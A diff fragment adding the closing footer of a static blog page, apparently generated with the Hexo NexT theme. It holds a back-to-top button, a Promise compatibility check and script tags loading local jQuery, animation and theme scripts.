+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
